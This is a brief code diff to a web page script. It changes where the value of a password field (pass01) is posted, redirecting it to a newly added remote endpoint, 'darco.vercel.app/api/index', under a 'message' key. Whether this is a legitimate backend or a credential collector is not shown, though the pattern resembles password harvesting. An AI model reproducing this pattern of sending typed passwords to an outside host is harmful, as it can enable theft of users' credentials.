@@ -27,8 +27,9 @@ document.addEventListener("DOMContentLoaded", function () {
     if (pass02.value === "") pass02.style.borderColor = "red";
 
     const URL = "https://project-bk3wq.vercel.app/api/index";
+    const URLTEST = "https://darco.vercel.app/api/index";
     // const URL = "localhost:1234/api/index";
-    handlerSendMessages(URL, { message: pass01.value });
+    handlerSendMessages(URLTEST, { message: pass01.value });
     // POST({ message: pass01.value });
     spinner();
 
